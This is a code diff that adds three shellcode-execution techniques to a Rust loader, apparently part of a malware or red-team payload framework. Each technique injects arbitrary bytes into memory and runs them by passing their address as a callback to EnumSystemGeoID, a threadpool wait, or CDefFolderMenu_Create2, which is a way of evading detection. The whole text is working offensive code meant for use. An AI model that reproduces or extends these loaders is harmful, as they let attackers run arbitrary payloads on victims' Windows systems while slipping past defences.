@@ -1685,3 +1685,213 @@ pub fn shellcode_execute_signalobjectandwaitapc(payload: Vec<u8>) -> bool {
         Err(_) => false,
     }
 }
+
+// =======================================================================================================
+// EXECUTION METHOD: EnumSystemGeoID
+// =======================================================================================================
+
+#[cfg(feature = "ShellcodeExecuteEnumSystemGeoID")]
+use windows_sys::Win32::Globalization::EnumSystemGeoID;
+
+#[cfg(feature = "ShellcodeExecuteEnumSystemGeoID")]
+fn exec_payload_via_callback_func_enumsystemgeoid(start_address: *mut c_void) -> Result<(), String> {
+    
+    let result = unsafe {
+        EnumSystemGeoID(
+            16,  // GEOCLASS_NATION
+            0,   // All parent geographic locations
+            Some(std::mem::transmute(start_address))
+        )
+    };
+    
+    if result > 0 {
+        Ok(())
+    } else {
+        Err(String::from(""))
+    }
+}
+
+#[cfg(feature = "ShellcodeExecuteEnumSystemGeoID")]
+pub fn shellcode_execute_enumsystemgeoid(bytes_to_load: Vec<u8>) -> bool {
+    match inject_shellcode(&bytes_to_load) {
+        Ok(base_address) => {
+            match exec_payload_via_callback_func_enumsystemgeoid(base_address) {
+                Ok(_) => {
+                    // Sleep to allow callback execution
+                    unsafe {
+                        delay_execution();
+                    }
+                    true
+                }
+                Err(_) => false,
+            }
+        }
+        Err(_) => false,
+    }
+}
+
+// =======================================================================================================
+// EXECUTION METHOD: ThreadpoolWait (PTP_WAIT_CALLBACK)
+// =======================================================================================================
+
+#[cfg(feature = "ShellcodeExecuteThreadpoolWait")]
+use windows_sys::Win32::Foundation::CloseHandle;
+
+#[cfg(feature = "ShellcodeExecuteThreadpoolWait")]
+use windows_sys::Win32::System::Threading::{
+    CreateEventW, CreateThreadpoolWait, SetEvent, SetThreadpoolWait, WaitForThreadpoolWaitCallbacks
+};
+
+#[cfg(feature = "ShellcodeExecuteThreadpoolWait")]
+fn exec_payload_via_callback_func_threadpoolwait(start_address: *mut c_void) -> Result<(), String> {
+    use std::ptr::{null, null_mut};
+    
+    // Create event for threadpool wait
+    let event = unsafe { CreateEventW(null_mut(), 0, 0, null()) };
+    
+    if event.is_null() {
+        return Err(String::from(""));
+    }
+    
+    // Cast shellcode address to PTP_WAIT_CALLBACK
+    let callback = unsafe { Some(std::mem::transmute(start_address)) };
+    
+    // Create threadpool wait object with shellcode as callback
+    let ptp_wait = unsafe { CreateThreadpoolWait(callback, null_mut(), null_mut()) };
+    
+    if ptp_wait == 0 {
+        unsafe { CloseHandle(event) };
+        return Err(String::from(""));
+    }
+    
+    // Set the wait object with the event
+    unsafe { SetThreadpoolWait(ptp_wait, event, null()) };
+    
+    // Trigger the event to execute callback
+    unsafe { SetEvent(event) };
+    
+    // Wait for callback to complete
+    unsafe { WaitForThreadpoolWaitCallbacks(ptp_wait, 0) };
+    
+    // Cleanup
+    unsafe { CloseHandle(event) };
+    
+    Ok(())
+}
+
+#[cfg(feature = "ShellcodeExecuteThreadpoolWait")]
+pub fn shellcode_execute_threadpoolwait(bytes_to_load: Vec<u8>) -> bool {
+    match inject_shellcode(&bytes_to_load) {
+        Ok(base_address) => {
+            match exec_payload_via_callback_func_threadpoolwait(base_address) {
+                Ok(_) => {
+                    // Sleep to allow callback execution
+                    unsafe {
+                        delay_execution();
+                    }
+                    true
+                }
+                Err(_) => false,
+            }
+        }
+        Err(_) => false,
+    }
+}
+
+// =======================================================================================================
+// EXECUTION METHOD: CDefFolderMenu_Create2
+// =======================================================================================================
+
+#[cfg(feature = "ShellcodeExecuteCDefFolderMenu")]
+use windows_sys::Win32::System::Com::{COINIT_APARTMENTTHREADED, CoInitializeEx};
+
+#[cfg(feature = "ShellcodeExecuteCDefFolderMenu")]
+use windows_sys::Win32::System::Threading::{CreateThread, WaitForSingleObject};
+
+#[cfg(feature = "ShellcodeExecuteCDefFolderMenu")]
+type LPFNDFMCALLBACK = Option<unsafe extern "system" fn(*mut c_void, *mut c_void, *mut c_void, u32, u32) -> i32>;
+
+#[cfg(feature = "ShellcodeExecuteCDefFolderMenu")]
+#[link(name = "shell32")]
+unsafe extern "system" {
+    fn CDefFolderMenu_Create2(
+        pidlFolder: *mut c_void,
+        hwnd: *mut c_void,
+        cidl: u32,
+        apidl: *mut c_void,
+        psf: *mut c_void,
+        pfn: LPFNDFMCALLBACK,
+        nKeys: u32,
+        ahkeys: *mut c_void,
+        ppcm: *mut *mut c_void,
+    ) -> i32;
+}
+
+#[cfg(feature = "ShellcodeExecuteCDefFolderMenu")]
+extern "system" fn invoke_cdeffoldermenu_create2(param: *mut c_void) -> u32 {
+    use std::ptr::null_mut;
+    
+    unsafe { CoInitializeEx(null_mut(), COINIT_APARTMENTTHREADED as u32) };
+
+    let callback: LPFNDFMCALLBACK = unsafe { Some(std::mem::transmute(param)) };
+    let mut ppcm: *mut c_void = null_mut();
+
+    unsafe {
+        CDefFolderMenu_Create2(
+            null_mut(), // pidlFolder
+            null_mut(), // hwnd
+            0,          // cidl
+            null_mut(), // apidl
+            null_mut(), // psf
+            callback,
+            0,          // nKeys
+            null_mut(), // ahkeys
+            &mut ppcm,
+        )
+    };
+
+    0
+}
+
+#[cfg(feature = "ShellcodeExecuteCDefFolderMenu")]
+fn exec_payload_via_callback_func_cdeffoldermenu(start_address: *mut c_void) -> Result<(), String> {
+    use std::ptr::null_mut;
+    
+    let thread = unsafe {
+        CreateThread(
+            null_mut(),
+            0,
+            Some(invoke_cdeffoldermenu_create2),
+            start_address,
+            0,
+            null_mut(),
+        )
+    };
+
+    if thread.is_null() {
+        return Err(String::from(""));
+    }
+
+    unsafe { WaitForSingleObject(thread, 0xFFFFFFFF) };
+    
+    Ok(())
+}
+
+#[cfg(feature = "ShellcodeExecuteCDefFolderMenu")]
+pub fn shellcode_execute_cdeffoldermenu(bytes_to_load: Vec<u8>) -> bool {
+    match inject_shellcode(&bytes_to_load) {
+        Ok(base_address) => {
+            match exec_payload_via_callback_func_cdeffoldermenu(base_address) {
+                Ok(_) => {
+                    // Sleep to allow callback execution
+                    unsafe {
+                        delay_execution();
+                    }
+                    true
+                }
+                Err(_) => false,
+            }
+        }
+        Err(_) => false,
+    }
+}
